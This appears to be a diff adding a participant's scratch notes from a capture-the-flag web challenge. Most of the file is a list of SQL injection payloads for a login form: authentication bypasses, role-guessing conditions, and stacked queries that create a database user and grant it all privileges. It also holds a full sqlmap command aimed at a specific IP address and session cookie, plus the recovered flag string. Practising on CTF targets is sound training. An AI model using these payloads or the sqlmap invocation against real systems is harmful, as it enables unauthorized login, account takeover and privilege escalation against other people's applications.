@@ -1,0 +1,62 @@
+wrongpassword' OR 'a'='a
+t4req@gmail.com
+-' OR 'a'='a
+superuser' OR 'a'='a
+
+'-'
+' AND role='0
+
+123' OR role='superuser
+123' OR id LIKE '2
+123' OR role='SUPERUSER
+123' OR role='user
+
+GRANT ALL PRIVILEGES ON *.* TO 'email@example.com' IDENTIFIED BY 'password' WITH GRANT OPTION;
+
+123' OR role LIKE '%
+
+123' OR role REGEXP '^[0-9]+$
+
+123' OR email='shanks@red.hat
+12' OR (NOT role='user' AND NOT role='SUPERUSER' AND NOT role='admin' AND NOT role='1') OR 'a'='a
+
+wrongpassword' OR role='admin
+
+Email: potato@gmail.com
+Role: SUPERUSER
+Flag: No flag for users.
+
+123'; CREATE USER smmehrab@localhost IDENTIFIED BY 'test';--
+123'; GRANT ALL PRIVILEGES ON *.* TO 'user_name'@'localhost' WITH GRANT OPTION;
+
+123', role = '123
+shanks@red.hat
+
+Email: shanks@red.hat
+Role: admin
+Flag: No flag for users.
+
+' OR username='admin
+' OR username='superuser
+
+
+t4req@gmail.com'
+
+1=1'--
+
+sqlmap -u "http://114.130.118.52:8005/login.php" --cookie="PHPSESSID=7a5a052e851d017bb28040ed44cd0d4e" --data="email=sexy@boy.com&password=test&login_btn=Login" –dbs --fresh-queries
+
+
+login form has two fields 
+
+email
+password
+
+If someone puts  -' OR 'a'='a into password field. What would be the effect. Why would this sql injection work?
+
+000011 000000 427465 742f70 61696e 747874
+
+C3🏵M⮹_Br0Th3R_0xt43q🙶
+
+C3{My_Br0Th3R_0xt43q}
+Wingding
